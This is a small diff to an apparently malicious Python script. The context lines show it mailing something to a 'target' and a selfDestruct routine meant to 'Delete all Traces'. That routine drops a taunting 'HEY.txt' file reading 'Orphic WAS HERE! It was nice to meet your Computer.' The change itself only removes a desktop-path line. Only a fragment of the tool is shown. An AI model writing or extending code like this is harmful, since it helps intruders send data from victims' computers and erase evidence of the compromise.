@@ -75,8 +75,7 @@ def __main__():
     server.sendmail(email, target, msg)
 
     def selfDestruct():
-        #Delete all Traces and leave a Message.
-        desktop = os.getenv('DESKTOP')
+        #Delete all Traces and leave a Message
         payload = open("HEY.txt", "w")
         payload.write("Orphic WAS HERE! It was nice to meet your Computer.")
         payload.close()
